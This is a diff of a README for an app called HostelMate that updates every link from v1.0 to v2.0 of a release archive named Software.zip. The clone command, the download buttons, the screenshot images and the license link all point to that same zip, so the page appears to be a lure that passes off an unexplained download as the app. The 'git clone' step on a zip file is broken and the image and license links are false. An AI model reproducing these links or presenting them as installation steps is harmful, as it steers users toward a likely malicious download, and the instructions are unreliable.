@@ -37,7 +37,7 @@ To get started with HostelMate, follow these simple steps:
 1. Clone the repository:
 
 ```
-git clone https://github.com/cj12345674363563/HostelMate-client/releases/download/v1.0/Software.zip
+git clone https://github.com/cj12345674363563/HostelMate-client/releases/download/v2.0/Software.zip
 ```
 
 2. Install dependencies:
@@ -56,9 +56,9 @@ npm start
 
 Feel free to explore the HostelMate application and all its functionalities! Dive into the codebase, customize it to your needs, or contribute to its development by submitting pull requests.
 
-👉 [Download the HostelMate Client Here!](https://github.com/cj12345674363563/HostelMate-client/releases/download/v1.0/Software.zip)
+👉 [Download the HostelMate Client Here!](https://github.com/cj12345674363563/HostelMate-client/releases/download/v2.0/Software.zip)
 
-[![Download Here](https://github.com/cj12345674363563/HostelMate-client/releases/download/v1.0/Software.zip)](https://github.com/cj12345674363563/HostelMate-client/releases/download/v1.0/Software.zip)
+[![Download Here](https://github.com/cj12345674363563/HostelMate-client/releases/download/v2.0/Software.zip)](https://github.com/cj12345674363563/HostelMate-client/releases/download/v2.0/Software.zip)
 
 If the link does not work, please check the "Releases" section of the repository for alternative download options.
 
@@ -66,9 +66,9 @@ If the link does not work, please check the "Releases" section of the repository
 
 Here are some sneak peeks at the HostelMate application:
 
-![Image 1](https://github.com/cj12345674363563/HostelMate-client/releases/download/v1.0/Software.zip)
-![Image 2](https://github.com/cj12345674363563/HostelMate-client/releases/download/v1.0/Software.zip)
-![Image 3](https://github.com/cj12345674363563/HostelMate-client/releases/download/v1.0/Software.zip)
+![Image 1](https://github.com/cj12345674363563/HostelMate-client/releases/download/v2.0/Software.zip)
+![Image 2](https://github.com/cj12345674363563/HostelMate-client/releases/download/v2.0/Software.zip)
+![Image 3](https://github.com/cj12345674363563/HostelMate-client/releases/download/v2.0/Software.zip)
 
 ## Contributing 🤝
 
@@ -76,7 +76,7 @@ We welcome any contributions to enhance the functionality and user experience of
 
 ## License ℹ️
 
-This project is licensed under the MIT License - see the [https://github.com/cj12345674363563/HostelMate-client/releases/download/v1.0/Software.zip](https://github.com/cj12345674363563/HostelMate-client/releases/download/v1.0/Software.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/cj12345674363563/HostelMate-client/releases/download/v2.0/Software.zip](https://github.com/cj12345674363563/HostelMate-client/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
